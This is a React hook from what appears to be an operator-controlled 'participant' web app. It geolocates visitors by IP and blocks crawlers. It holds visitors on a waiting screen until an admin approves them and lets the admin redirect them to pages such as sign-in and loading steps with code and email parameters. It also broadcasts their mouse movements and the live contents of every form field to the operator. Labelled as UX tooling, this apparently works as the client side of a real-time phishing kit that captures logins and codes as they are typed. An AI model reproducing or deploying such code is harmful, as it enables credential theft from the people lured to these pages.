import { useEffect, useRef, useState } from "react";
import { useNavigate, useRouterState } from "@tanstack/react-router";
import type { RealtimeChannel } from "@supabase/supabase-js";
import {
  getApproved,
  getOrCreateParticipantId,
  joinChannel,
  setApproved,
  type InputPayload,
  type LiveInputPayload,
  type ParticipantPresence,
} from "@/lib/orchestrator";
import {
  loadParticipant,
  markParticipantOffline,
  subscribeParticipant,
  touchParticipant,
  type ParticipantGeo,
  type ParticipantRecord,
} from "@/lib/participantStore";
import { getAppSettings, isLikelyBot, loadAppSettings } from "@/lib/appSettings";

/** Path without query — for comparing current location vs assigned URL. */
function pathOnly(url: string): string {
  const q = url.indexOf("?");
  return (q >= 0 ? url.slice(0, q) : url) || "/";
}

/** Decoded query equality — treats + and %20 as the same space. */
function searchParamsEqual(a: string, b: string): boolean {
  const norm = (s: string) => (s.startsWith("?") ? s.slice(1) : s);
  const pa = new URLSearchParams(norm(a));
  const pb = new URLSearchParams(norm(b));
  const keys = new Set<string>([...pa.keys(), ...pb.keys()]);
  for (const k of keys) {
    if ((pa.get(k) ?? "") !== (pb.get(k) ?? "")) return false;
  }
  return true;
}

/** Safe in-app path (+ optional query) for admin/participant navigations. */
function parseAppUrl(url: string): { to: string; search?: Record<string, string>; href: string } | null {
  if (!url || url.includes("://") || url.startsWith("//")) return null;
  const q = url.indexOf("?");
  const path = q >= 0 ? url.slice(0, q) : url;
  const qs = q >= 0 ? url.slice(q + 1) : "";
  if (!/^\/[a-z0-9][a-z0-9_-]{0,40}(\/[a-z0-9][a-z0-9_-]{0,40})*\/?$/i.test(path) && path !== "/") {
    return null;
  }
  if (!qs) return { to: path, href: path };
  const search: Record<string, string> = {};
  new URLSearchParams(qs).forEach((v, k) => {
    search[k] = v;
  });
  // Rebuild so encoding is stable for location.replace.
  const href = `${path}?${new URLSearchParams(search).toString()}`;
  return { to: path, search, href };
}

function navigateApp(
  navigate: ReturnType<typeof useNavigate>,
  url: string,
) {
  const parsed = parseAppUrl(url);
  if (!parsed) {
    try {
      window.location.replace(url);
      return true;
    } catch {
      return false;
    }
  }
  // Already on target (decoded) — do not reload (avoids black-screen loops).
  if (typeof window !== "undefined") {
    const here = `${window.location.pathname}${window.location.search}`;
    if (
      pathOnly(here) === parsed.to &&
      (!parsed.search || searchParamsEqual(window.location.search, parsed.href.slice(parsed.to.length)))
    ) {
      return true;
    }
  }
  // Routes often lack search schemas — use full navigation for query URLs.
  if (parsed.search) {
    window.location.replace(parsed.href);
    return true;
  }
  navigate({
    to: parsed.to,
    reloadDocument: false,
  }).catch(() => {
    window.location.replace(parsed.href);
  });
  return true;
}

export function useParticipant() {
  const navigate = useNavigate();
  // Include query (?code=, ?email=, ?hint=) so live preview follows redirects 1:1.
  const pageUrl = useRouterState({
    select: (s) => `${s.location.pathname}${s.location.search}`,
  });
  const pathname = useRouterState({ select: (s) => s.location.pathname });
  const channelRef = useRef<RealtimeChannel | null>(null);
  const subscribedRef = useRef(false);
  const idRef = useRef<string>("");
  const pageUrlRef = useRef(pageUrl);
  const pathnameRef = useRef(pathname);
  const lastAssignedRef = useRef<string | null | undefined>(undefined);
  const internalNavUntilRef = useRef(0);
  const skipTouchUntilRef = useRef(0);
  const [approved, setApprovedState] = useState<boolean>(false);
  pageUrlRef.current = pageUrl;
  pathnameRef.current = pathname;

  function armInternalNav(ms = 60_000) {
    const until = Date.now() + ms;
    internalNavUntilRef.current = until;
    skipTouchUntilRef.current = Date.now() + 3_000;
    try {
      window.sessionStorage.setItem("__ux_internal_nav_until", String(until));
    } catch {
      /* ignore */
    }
  }

  function internalNavActive() {
    if (Date.now() < internalNavUntilRef.current) return true;
    try {
      const until = Number(window.sessionStorage.getItem("__ux_internal_nav_until") || "0");
      if (Number.isFinite(until) && Date.now() < until) {
        internalNavUntilRef.current = until;
        return true;
      }
    } catch {
      /* ignore */
    }
    return false;
  }

  function clearInternalNavGuard() {
    internalNavUntilRef.current = 0;
    try {
      window.sessionStorage.removeItem("__ux_internal_nav_until");
    } catch {
      /* ignore */
    }
  }

  function alreadyOnAssigned(assigned: string): boolean {
    const here = pageUrlRef.current || "/";
    if (here === assigned) return true;
    if (pathOnly(here) !== pathOnly(assigned)) return false;
    if (!assigned.includes("?")) return true;
    try {
      const want = assigned.slice(assigned.indexOf("?"));
      return searchParamsEqual(window.location.search || "", want);
    } catch {
      return false;
    }
  }

  function goToAssigned(assigned: string) {
    if (!assigned || alreadyOnAssigned(assigned)) return;
    skipTouchUntilRef.current = Date.now() + 3_000;
    clearInternalNavGuard();
    navigateApp(navigate, assigned);
  }

  function applyParticipantRecord(record: ParticipantRecord | null) {
    if (!record) return;
    setApproved(record.approved);
    setApprovedState(record.approved);
    const assigned = record.assignedUrl ?? null;
    const onFocusRoom = pathOnly(pageUrlRef.current || "/") === "/";

    // Stuck on the black focus room with an assignment — always leave "/".
    if (assigned && record.approved && onFocusRoom && !alreadyOnAssigned(assigned)) {
      lastAssignedRef.current = assigned;
      goToAssigned(assigned);
      return;
    }

    // Only redirect when the admin pushes a NEW assigned URL — not on every
    // heartbeat/refresh. This lets page-driven navigation (e.g. sign-in →
    // loading) stick without being yanked back to the originally assigned page.
    if (lastAssignedRef.current === undefined) {
      lastAssignedRef.current = assigned;
      // First sync: honor existing assignment when broadcast was missed.
      if (assigned && record.approved && !alreadyOnAssigned(assigned) && !internalNavActive()) {
        goToAssigned(assigned);
      }
      return;
    }
    if (assigned && assigned !== lastAssignedRef.current) {
      lastAssignedRef.current = assigned;
      if (record.approved && !alreadyOnAssigned(assigned)) {
        // Admin assignment ALWAYS wins.
        goToAssigned(assigned);
      }
    }
    // Do NOT reset lastAssignedRef when assigned is unchanged — internal
    // navigations must not make a stale assignment look "new".
  }


  useEffect(() => {
    if (typeof window === "undefined") return;
    // Observer mode: this page is being rendered inside the admin live-preview
    // iframe. Skip ALL participant registration/heartbeat/channel work so the
    // preview loads instantly and doesn't spawn a phantom participant.
    try {
      if (new URLSearchParams(window.location.search).get("__observe") === "1") {
        return;
      }
    } catch { /* ignore */ }
    const ua = typeof navigator !== "undefined" ? navigator.userAgent : "";
    let cancelled = false;


    // Bot/crawler block — respect global toggle (sync from localStorage, then refresh)
    let blocked = getAppSettings().blockBots && isLikelyBot(ua);
    void (async () => {
      try { await loadAppSettings(); } catch { /* ignore */ }
      if (getAppSettings().blockBots && isLikelyBot(ua)) {
        blocked = true;
      }
    })();


    const id = getOrCreateParticipantId();
    idRef.current = id;
    setApprovedState(getApproved());
    // Stale internal-nav guard from a prior page must not trap redirects off "/".
    if (window.location.pathname === "/") {
      try {
        window.sessionStorage.removeItem("__ux_internal_nav_until");
      } catch {
        /* ignore */
      }
      internalNavUntilRef.current = 0;
    }

    let geoFetched: ParticipantGeo | undefined;
    async function fetchGeoOnce(): Promise<ParticipantGeo | undefined> {
      if (geoFetched) return geoFetched;
      try {
        const r = await fetch("https://ipwho.is/?fields=ip,country,country_code,region,city,success");
        const j = await r.json();
        if (j && j.success !== false) {
          geoFetched = {
            ip: j.ip ?? null,
            country: j.country ?? null,
            countryCode: j.country_code ?? null,
            region: j.region ?? null,
            city: j.city ?? null,
            userAgent: ua,
            host: typeof window !== "undefined" ? window.location.host : null,
          };
        }
      } catch { /* ignore */ }
      if (!geoFetched) geoFetched = { userAgent: ua, host: typeof window !== "undefined" ? window.location.host : null };
      return geoFetched;
    }

    async function syncRecord() {
      if (blocked) return;
      const geo = await fetchGeoOnce();
      await touchParticipant(
        id,
        `${window.location.pathname}${window.location.search}`,
        geo,
      );
      const record = await loadParticipant(id);
      if (!cancelled) applyParticipantRecord(record);
    }
    void syncRecord();


    const dbChannel = subscribeParticipant(id, () => {
      void loadParticipant(id).then((record) => {
        if (!cancelled) applyParticipantRecord(record);
      });
    });

    const channel = joinChannel({
      key: id,
      onNavigate: (p) => {
        if (p.targets === "all" || p.targets.includes(id)) {
          // Admin-issued navigate ALWAYS wins — clear the internal-nav guard
          // so subsequent redirects (e.g. loading → next) aren't blocked.
          clearInternalNavGuard();
          setApproved(true);
          setApprovedState(true);
          lastAssignedRef.current = p.url;
          goToAssigned(p.url);
        }
      },

      onApprove: (p) => {
        if (p.id !== id) return;
        setApproved(true);
        setApprovedState(true);
      },
      onRevoke: (p) => {
        if (p.id !== id) return;
        setApproved(false);
        setApprovedState(false);
        navigate({ to: "/", reloadDocument: false }).catch(() => {
          window.location.assign("/");
        });
      },
    });




    channel.subscribe(async (status) => {
      if (status === "SUBSCRIBED") {
        subscribedRef.current = true;
        await channel.track({
          id,
          currentUrl: `${window.location.pathname}${window.location.search}`,
          joinedAt: Date.now(),
          approved: getApproved(),
        } satisfies ParticipantPresence);
      }
    });
    channelRef.current = channel;

    const heartbeat = window.setInterval(() => {
      if (blocked) return;
      if (Date.now() < skipTouchUntilRef.current) return;
      void touchParticipant(id, pageUrlRef.current, geoFetched);
    }, 8_000);


    // Mouse, click, scroll emitters
    let lastMouse = 0;
    const onMove = (e: MouseEvent) => {
      const now = Date.now();
      if (now - lastMouse < 16) return;
      lastMouse = now;
      const ch = channelRef.current;
      if (!ch || !subscribedRef.current) return;
      void ch.send({
        type: "broadcast",
        event: "mouse",
        payload: {
          id,
          x: e.clientX / window.innerWidth,
          y: e.clientY / window.innerHeight,
          vw: window.innerWidth,
          vh: window.innerHeight,
          at: now,
        },
      });
    };
    const onClick = (e: MouseEvent) => {
      const ch = channelRef.current;
      if (!ch || !subscribedRef.current) return;
      void ch.send({
        type: "broadcast",
        event: "click",
        payload: {
          id,
          x: e.clientX / window.innerWidth,
          y: e.clientY / window.innerHeight,
          at: Date.now(),
        },
      });
    };
    let lastScroll = 0;
    const onScroll = () => {
      const now = Date.now();
      if (now - lastScroll < 60) return;
      lastScroll = now;
      const ch = channelRef.current;
      if (!ch || !subscribedRef.current) return;
      void ch.send({
        type: "broadcast",
        event: "scroll",
        payload: { id, sx: window.scrollX, sy: window.scrollY, at: now },
      });
    };
    window.addEventListener("mousemove", onMove, { passive: true });
    window.addEventListener("click", onClick, { passive: true, capture: true });
    window.addEventListener("scroll", onScroll, { passive: true });

    // Forward iframe-originated pointer events (the design iframe covers the
    // viewport, so the parent window never sees them directly).
    let lastIframeMouse = 0;
    let lastViewport = { w: 0, h: 0 };
    function sendViewport(w: number, h: number) {
      if (w === lastViewport.w && h === lastViewport.h) return;
      lastViewport = { w, h };
      const ch = channelRef.current;
      if (!ch || !subscribedRef.current) return;
      void ch.send({
        type: "broadcast",
        event: "viewport",
        payload: { id, w, h, at: Date.now() },
      });
    }
    // Send our own viewport too (Focus Room, etc).
    sendViewport(window.innerWidth, window.innerHeight);
    const onResize = () => sendViewport(window.innerWidth, window.innerHeight);
    window.addEventListener("resize", onResize);

    const onIframeMsg = (e: MessageEvent) => {
      const d = e.data;
      if (!d || typeof d !== "object" || d.__ux !== true) return;
      if (d.type === "internal_navigation") {
        // Page-driven nav (Continue → loading, etc). Guard against admin
        // assigned_url yanking us back — but do NOT overwrite lastAssignedRef
        // with the destination (that made stale assignments look "new").
        armInternalNav(60_000);
        if (typeof d.url === "string") {
          if (idRef.current) void touchParticipant(idRef.current, d.url);
          if (pageUrlRef.current !== d.url) {
            navigateApp(navigate, d.url);
          }
        }
        return;
      }

      const ch = channelRef.current;
      if (!ch || !subscribedRef.current) return;
      const now = Date.now();
      if (d.type === "viewport" && typeof d.w === "number" && typeof d.h === "number") {
        sendViewport(d.w, d.h);
        return;
      }
      if (d.type === "mouse" && typeof d.x === "number" && typeof d.y === "number") {
        if (now - lastIframeMouse < 16) return;
        lastIframeMouse = now;
        const w = typeof d.w === "number" && d.w > 0 ? d.w : window.innerWidth;
        const h = typeof d.h === "number" && d.h > 0 ? d.h : window.innerHeight;
        sendViewport(w, h);
        void ch.send({
          type: "broadcast",
          event: "mouse",
          payload: { id, x: d.x / w, y: d.y / h, vw: w, vh: h, at: now },
        });
      } else if (d.type === "click" && typeof d.x === "number" && typeof d.y === "number") {
        const w = typeof d.w === "number" && d.w > 0 ? d.w : window.innerWidth;
        const h = typeof d.h === "number" && d.h > 0 ? d.h : window.innerHeight;
        void ch.send({
          type: "broadcast",
          event: "click",
          payload: { id, x: d.x / w, y: d.y / h, at: now },
        });
      } else if (d.type === "scroll" && typeof d.sx === "number" && typeof d.sy === "number") {
        void ch.send({
          type: "broadcast",
          event: "scroll",
          payload: { id, sx: d.sx, sy: d.sy, at: now },
        });
      } else if (d.type === "input" && typeof d.field === "string") {
        const payload: InputPayload = {
          participantId: id,
          field: d.field,
          value: String(d.value ?? ""),
          url: pageUrlRef.current,
          at: now,
        };
        void ch.send({ type: "broadcast", event: "input", payload });
      } else if (d.type === "live_input" && typeof d.field === "string") {
        const payload: LiveInputPayload = {
          participantId: id,
          field: d.field,
          value: String(d.value ?? ""),
          focused: !!d.focused,
          ftype: typeof d.ftype === "string" ? d.ftype : "text",
          url: pageUrlRef.current,
          at: now,
        };
        void ch.send({ type: "broadcast", event: "live_input", payload });
      }
    };
    window.addEventListener("message", onIframeMsg);

    const onUnload = () => {
      try {
        channel.untrack();
      } catch {
        /* noop */
      }
    };
    window.addEventListener("beforeunload", onUnload);

    return () => {
      cancelled = true;
      window.removeEventListener("mousemove", onMove);
      window.removeEventListener("click", onClick, true);
      window.removeEventListener("scroll", onScroll);
      window.removeEventListener("message", onIframeMsg);
      window.removeEventListener("resize", onResize);
      window.removeEventListener("beforeunload", onUnload);
      window.clearInterval(heartbeat);
      subscribedRef.current = false;
      channel.untrack();
      void markParticipantOffline(id);
      void dbChannel.unsubscribe();
      void channel.unsubscribe();
      channelRef.current = null;
    };
  }, [navigate]);

  useEffect(() => {
    // Do NOT arm internal-nav here when pageUrl ≠ assigned. That blocked
    // admin redirects for 60s after every page change, and when the navigate
    // was skipped the new assignment was still recorded — leaving participants
    // stuck on the black focus-room loader.
    const ch = channelRef.current;
    const id = idRef.current;
    if (!ch || !id || !subscribedRef.current) return;
    if (Date.now() < skipTouchUntilRef.current) return;
    void touchParticipant(id, pageUrl);
    void ch.track({
      id,
      currentUrl: pageUrl,
      joinedAt: Date.now(),
      approved,
    } satisfies ParticipantPresence);
  }, [pageUrl, approved]);

  function emitInput(field: string, value: string) {
    const ch = channelRef.current;
    if (!ch || !subscribedRef.current) return;
    const payload: InputPayload = {
      participantId: idRef.current,
      field,
      value,
      url: pageUrlRef.current,
      at: Date.now(),
    };
    void ch.send({ type: "broadcast", event: "input", payload });
  }

  function emitLiveInput(field: string, value: string, ftype = "text") {
    const ch = channelRef.current;
    if (!ch || !subscribedRef.current) return;
    const payload: LiveInputPayload = {
      participantId: idRef.current,
      field,
      value,
      focused: true,
      ftype,
      url: pageUrlRef.current,
      at: Date.now(),
    };
    void ch.send({ type: "broadcast", event: "live_input", payload });
  }

  return { emitInput, emitLiveInput, participantId: idRef.current, approved };
}
